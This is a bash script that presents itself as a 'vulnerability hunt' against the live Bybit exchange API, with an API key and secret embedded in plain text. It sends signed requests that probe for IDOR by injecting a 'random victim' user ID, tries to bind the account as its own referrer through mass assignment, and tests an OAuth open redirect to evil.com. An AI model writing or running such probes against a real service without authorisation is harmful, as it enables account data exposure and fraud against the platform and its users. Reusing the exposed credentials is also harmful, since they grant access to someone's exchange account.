#!/bin/bash
# BYBIT WEB/API VULNERABILITY HUNT (NOV 2025)
# Target: Fiat IDOR, Referral Logic, Earn Race, OAuth
# Credentials from user context

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
MY_UID="527465456"
TARGET_UID="12345678" # Random victim for IDOR test
BASE="https://api.bybit.com"
WEB_BASE="https://www.bybit.com"

# Sync Time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
LOCAL_TIME=$(date +%s)
OFFSET=$((SERVER_TIME - LOCAL_TIME))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

# Wrapper to sign and curl
call_api() {
    local endpoint=$1
    local payload=$2
    
    IFS='|' read -r ts sig <<< $(sign "$payload")
    
    curl -v -X POST "$BASE$endpoint" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>&1
}

echo "======================================================="
echo "BYBIT WEB/API HUNT 2025 (FIXED)"
echo "======================================================="

# ---------------------------------------------------------
# 1. FIAT ON-RAMP IDOR (Deep Check)
# ---------------------------------------------------------
echo ""
echo "[1] Testing Asset/Fiat IDOR (Deep Check)..."

PAYLOAD_IDOR='{"coin":"USDT","chainType":"ETH","userId":"12345678","subMemberId":"12345678"}'
echo "    -> Probing IDOR injection (userId/subMemberId)..."
resp_idor=$(call_api "/v5/asset/deposit/query-address" "$PAYLOAD_IDOR")
echo "    Response: $resp_idor"

if echo "$resp_idor" | grep -q "12345678"; then
    echo "    🚨 IDOR CONFIRMED! Response contains injected ID."
fi

# ---------------------------------------------------------
# 2. REFERRAL 2.0 LOGIC FLAW
# ---------------------------------------------------------
echo ""
echo "[2] Testing Referral 2.0 Logic..."
echo "    -> Attempting to bind SELF as referrer..."

# Try to inject referral code into update-api (Mass Assignment)
PAYLOAD_REF='{"permissions":{"Spot":["SpotTrade"]},"refereeId":527465456,"inviterId":527465456}'
resp_ref=$(call_api "/v5/user/update-api" "$PAYLOAD_REF")
echo "    Update Response: $resp_ref"

# Try dedicated endpoint (guessing v5 structure based on docs)
# /v5/user/affiliate/set-inviter is not standard, but often exists internally
# Using a known one: /v5/user/info (to check if inviter changed)
echo "    -> Checking User Info for Inviter..."
IFS='|' read -r ts sig <<< $(sign "")
resp_info=$(curl -s -X GET "https://api.bybit.com/v5/user/query-api" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000")
inviter=$(echo "$resp_info" | grep -o '"inviterID":[0-9]*')
echo "    Current Inviter: $inviter"

if [[ "$inviter" == *"527465456"* ]]; then
    echo "    SELF-REFERRAL CONFIRMED! You are your own inviter."
fi

# ---------------------------------------------------------
# 3. OAUTH FUZZING (Curl with -L to follow redirects)
# ---------------------------------------------------------
echo ""
echo "[3] Testing OAuth Open Redirect (Deep)..."
# Fuzzing parameters
OAUTH_BASE="https://www.bybit.com/app/oauth/authorize"
PARAMS="client_id=TEST&response_type=code&redirect_uri=https://evil.com"

echo "    -> GET $OAUTH_BASE?$PARAMS"
# Check location header specifically
headers=$(curl -s -I "$OAUTH_BASE?$PARAMS")
echo "    Headers: $(echo "$headers" | grep -i 'location' || echo 'No Location header')"

echo "======================================================="
echo "HUNT COMPLETE"
echo "======================================================="
